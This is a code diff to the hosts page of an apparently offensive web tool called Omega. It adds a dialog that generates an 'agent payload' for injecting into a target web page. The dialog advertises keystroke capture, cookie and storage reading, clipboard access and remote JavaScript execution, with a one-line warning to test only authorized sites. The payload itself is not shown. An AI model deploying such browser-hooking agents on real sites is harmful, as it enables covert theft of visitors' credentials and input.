@@ -2,10 +2,10 @@
 import { useState } from "react";
 import { Link } from "wouter";
 import { Layout } from "@/components/layout";
-import { 
-  useListHosts, 
-  useDeleteHost, 
-  usePingHost, 
+import {
+  useListHosts,
+  useDeleteHost,
+  usePingHost,
   useCreateHost,
   getListHostsQueryKey,
   getGetDashboardSummaryQueryKey
@@ -22,9 +22,11 @@ import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "
 import { useForm } from "react-hook-form";
 import { z } from "zod";
 import { zodResolver } from "@hookform/resolvers/zod";
-import { Search, Plus, Activity, Trash2, Edit, Network } from "lucide-react";
+import { Search, Plus, Activity, Trash2, Edit, Network, Code2, Copy, Check, ChevronDown } from "lucide-react";
 import { format } from "date-fns";
 import { useToast } from "@/hooks/use-toast";
+
+const BASE_API = "/api";
 
 const hostSchema = z.object({
   label: z.string().min(1, "Label is required"),
@@ -35,6 +37,140 @@ const hostSchema = z.object({
 });
 
 type HostFormValues = z.infer<typeof hostSchema>;
+
+type AgentInfo = { hostId: number; token: string; apiBase: string; script: string };
+
+function AgentScriptDialog({ hostId, hostLabel }: { hostId: number; hostLabel: string }) {
+  const [open, setOpen] = useState(false);
+  const [loading, setLoading] = useState(false);
+  const [agent, setAgent] = useState<AgentInfo | null>(null);
+  const [copied, setCopied] = useState(false);
+  const { toast } = useToast();
+
+  const fetchAgent = async () => {
+    setLoading(true);
+    try {
+      const r = await fetch(`${BASE_API}/hosts/${hostId}/agent-script`);
+      if (!r.ok) throw new Error("Failed to generate agent script");
+      const data = await r.json();
+      setAgent(data);
+    } catch (e: any) {
+      toast({ title: "Error", description: e.message, variant: "destructive" });
+    } finally {
+      setLoading(false);
+    }
+  };
+
+  const handleOpen = (isOpen: boolean) => {
+    setOpen(isOpen);
+    if (isOpen && !agent) fetchAgent();
+  };
+
+  const copyScript = () => {
+    if (!agent) return;
+    const snippet = `<script>\n${agent.script}\n</script>`;
+    navigator.clipboard.writeText(snippet).then(() => {
+      setCopied(true);
+      setTimeout(() => setCopied(false), 2000);
+      toast({ title: "Copied to clipboard" });
+    });
+  };
+
+  return (
+    <Dialog open={open} onOpenChange={handleOpen}>
+      <DialogTrigger asChild>
+        <Button variant="outline" size="sm" className="h-8 px-2 gap-1 border-primary/30 text-primary hover:bg-primary/10" title="Generate agent script">
+          <Code2 className="h-3.5 w-3.5" />
+          <span className="text-xs hidden sm:inline">Agent</span>
+        </Button>
+      </DialogTrigger>
+      <DialogContent className="max-w-3xl max-h-[90vh] flex flex-col">
+        <DialogHeader>
+          <DialogTitle className="flex items-center gap-2">
+            <Code2 className="h-5 w-5 text-primary" />
+            Omega Agent — {hostLabel}
+          </DialogTitle>
+        </DialogHeader>
+
+        <div className="flex-1 overflow-y-auto space-y-4 pr-1">
+          <div className="bg-primary/5 border border-primary/20 rounded-md p-3 text-sm space-y-1">
+            <p className="font-semibold text-primary">How to use</p>
+            <p className="text-muted-foreground text-xs leading-relaxed">
+              Paste the script below into the <code className="bg-muted px-1 rounded text-xs">&lt;head&gt;</code> or <code className="bg-muted px-1 rounded text-xs">&lt;body&gt;</code> of
+              the web page you want to test. Once the page loads, the agent connects back to Omega and begins streaming data.
+              All Omega tools (keylogger, screen capture, remote commands, processes, etc.) will then receive live data.
+            </p>
+            <p className="text-yellow-400/80 text-xs">⚠ Use only on websites you own or have explicit written authorization to test.</p>
+          </div>
+
+          {loading ? (
+            <div className="space-y-2">
+              <Skeleton className="h-4 w-48" />
+              <Skeleton className="h-64 w-full" />
+            </div>
+          ) : agent ? (
+            <>
+              <div className="grid grid-cols-2 gap-3 text-xs font-mono">
+                <div className="bg-card border border-border rounded p-2">
+                  <p className="text-muted-foreground/60 uppercase text-[10px] mb-1">Host ID</p>
+                  <p className="text-primary">{agent.hostId}</p>
+                </div>
+                <div className="bg-card border border-border rounded p-2">
+                  <p className="text-muted-foreground/60 uppercase text-[10px] mb-1">Agent Token</p>
+                  <p className="text-primary truncate" title={agent.token}>{agent.token.substring(0, 16)}…</p>
+                </div>
+                <div className="bg-card border border-border rounded p-2 col-span-2">
+                  <p className="text-muted-foreground/60 uppercase text-[10px] mb-1">API Base</p>
+                  <p className="text-primary truncate">{agent.apiBase}</p>
+                </div>
+              </div>
+
+              <div>
+                <div className="flex items-center justify-between mb-2">
+                  <p className="text-xs text-muted-foreground uppercase tracking-wider">Agent Payload — copy and inject into target page</p>
+                  <Button size="sm" variant="outline" onClick={copyScript} className="h-7 text-xs gap-1 border-primary/30 text-primary">
+                    {copied ? <Check className="h-3.5 w-3.5" /> : <Copy className="h-3.5 w-3.5" />}
+                    {copied ? "Copied!" : "Copy Snippet"}
+                  </Button>
+                </div>
+                <pre className="bg-black/60 border border-border rounded-md p-3 text-[10px] font-mono text-green-400/90 overflow-auto max-h-72 leading-relaxed whitespace-pre-wrap">
+{`<script>\n${agent.script.substring(0, 1200)}${agent.script.length > 1200 ? "\n/* … truncated — copy full script above … */" : "\n</script>"}`}
+                </pre>
+              </div>
+
+              <Card className="border-border/40 bg-card/30">
+                <CardHeader className="pb-1 pt-3 px-3">
+                  <CardTitle className="text-xs text-muted-foreground">Agent Capabilities</CardTitle>
+                </CardHeader>
+                <CardContent className="px-3 pb-3">
+                  <div className="grid grid-cols-2 gap-x-4 gap-y-1 text-xs text-muted-foreground">
+                    {[
+                      "✓ Real keystroke capture",
+                      "✓ Canvas DOM screenshots",
+                      "✓ localStorage / sessionStorage",
+                      "✓ Cookie reader",
+                      "✓ Form enumeration",
+                      "✓ Loaded script inventory",
+                      "✓ Remote JS execution",
+                      "✓ HTML injection",
+                      "✓ Element click & form fill",
+                      "✓ Overlay injection",
+                      "✓ Clipboard read/write",
+                      "✓ Service worker discovery",
+                      "✓ Browser fingerprint (OS, RAM, GPU, screen)",
+                      "✓ Page navigation control",
+                      "✓ Real-time event streaming",
+                    ].map(cap => <p key={cap}>{cap}</p>)}
+                  </div>
+                </CardContent>
+              </Card>
+            </>
+          ) : null}
+        </div>
+      </DialogContent>
+    </Dialog>
+  );
+}
 
 export default function Hosts() {
   const { data: hosts, isLoading } = useListHosts();
@@ -49,13 +185,7 @@ export default function Hosts() {
 
   const form = useForm<HostFormValues>({
     resolver: zodResolver(hostSchema),
-    defaultValues: {
-      label: "",
-      ip: "",
-      port: 22,
-      os: "",
-      comments: "",
-    },
+    defaultValues: { label: "", ip: "", port: 22, os: "", comments: "" },
   });
 
   const onSubmit = (data: HostFormValues) => {
@@ -89,17 +219,17 @@ export default function Hosts() {
     pingHost.mutate({ id }, {
       onSuccess: (result) => {
         queryClient.invalidateQueries({ queryKey: getListHostsQueryKey() });
-        toast({ 
-          title: `Ping result: ${result.status}`, 
-          description: result.latencyMs ? `Latency: ${result.latencyMs}ms` : "Host unreachable",
-          variant: result.status === "online" ? "default" : "destructive" 
+        toast({
+          title: `Ping: ${result.status}`,
+          description: result.latencyMs ? `TCP latency: ${result.latencyMs}ms` : "Host unreachable (TCP timeout)",
+          variant: result.status === "online" ? "default" : "destructive"
         });
       }
     });
   };
 
-  const filteredHosts = hosts?.filter(h => 
-    h.label.toLowerCase().includes(search.toLowerCase()) || 
+  const filteredHosts = hosts?.filter(h =>
+    h.label.toLowerCase().includes(search.toLowerCase()) ||
     h.ip.includes(search)
   ) || [];
 
@@ -109,9 +239,9 @@ export default function Hosts() {
         <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4">
           <div>
             <h1 className="text-3xl font-bold tracking-tight">Host Address Book</h1>
-            <p className="text-muted-foreground mt-1">Manage and monitor network infrastructure.</p>
+            <p className="text-muted-foreground mt-1">Manage hosts and deploy live Omega agents.</p>
           </div>
-          
+
           <div className="flex w-full sm:w-auto items-center gap-2">
             <div className="relative flex-1 sm:w-64">
               <Search className="absolute left-2.5 top-2.5 h-4 w-4 text-muted-foreground" />
@@ -123,7 +253,7 @@ export default function Hosts() {
                 onChange={(e) => setSearch(e.target.value)}
               />
             </div>
-            
+
             <Dialog open={isAddOpen} onOpenChange={setIsAddOpen}>
               <DialogTrigger asChild>
                 <Button className="gap-2">
@@ -153,7 +283,7 @@ export default function Hosts() {
                         name="ip"
                         render={({ field }) => (
                           <FormItem>
-                            <FormLabel>IP Address</FormLabel>
+                            <FormLabel>IP / Hostname</FormLabel>
                             <FormControl><Input placeholder="192.168.1.1" {...field} /></FormControl>
                             <FormMessage />
                           </FormItem>
@@ -221,12 +351,9 @@ export default function Hosts() {
                   {isLoading ? (
                     Array.from({ length: 5 }).map((_, i) => (
                       <TableRow key={i}>
-                        <TableCell><Skeleton className="h-4 w-[150px]" /></TableCell>
-                        <TableCell><Skeleton className="h-4 w-[100px]" /></TableCell>
-                        <TableCell><Skeleton className="h-4 w-[80px]" /></TableCell>
-                        <TableCell className="hidden md:table-cell"><Skeleton className="h-4 w-[60px]" /></TableCell>
-                        <TableCell className="hidden lg:table-cell"><Skeleton className="h-4 w-[120px]" /></TableCell>
-                        <TableCell><Skeleton className="h-8 w-[100px] ml-auto" /></TableCell>
+                        {Array.from({ length: 6 }).map((_, j) => (
+                          <TableCell key={j}><Skeleton className="h-4 w-full" /></TableCell>
+                        ))}
                       </TableRow>
                     ))
                   ) : filteredHosts.length === 0 ? (
@@ -250,7 +377,7 @@ export default function Hosts() {
                         <TableCell>
                           <div className="flex items-center gap-2">
                             <span className={`w-2.5 h-2.5 rounded-full ${
-                              host.status === 'online' ? 'bg-primary shadow-[0_0_8px_hsl(var(--primary))]' : 
+                              host.status === 'online' ? 'bg-primary shadow-[0_0_8px_hsl(var(--primary))]' :
                               host.status === 'offline' ? 'bg-destructive' : 'bg-muted-foreground'
                             }`} />
                             <span className="capitalize text-xs font-semibold">{host.status}</span>
@@ -263,13 +390,15 @@ export default function Hosts() {
                           {host.lastSeen ? format(new Date(host.lastSeen), "MM/dd/yy HH:mm:ss") : 'Never'}
                         </TableCell>
                         <TableCell className="text-right">
-                          <div className="flex justify-end gap-2">
-                            <Button 
-                              variant="outline" 
-                              size="sm" 
+                          <div className="flex justify-end gap-1.5">
+                            <AgentScriptDialog hostId={host.id} hostLabel={host.label} />
+                            <Button
+                              variant="outline"
+                              size="sm"
                               className="h-8 w-8 p-0"
                               onClick={() => handlePing(host.id)}
                               disabled={pingHost.isPending}
+                              title="TCP Ping"
                             >
                               <Activity className="h-4 w-4" />
                             </Button>
@@ -278,9 +407,9 @@ export default function Hosts() {
                                 <Edit className="h-4 w-4" />
                               </Button>
                             </Link>
-                            <Button 
-                              variant="destructive" 
-                              size="sm" 
+                            <Button
+                              variant="destructive"
+                              size="sm"
                               className="h-8 w-8 p-0"
                               onClick={() => handleDelete(host.id)}
                             >
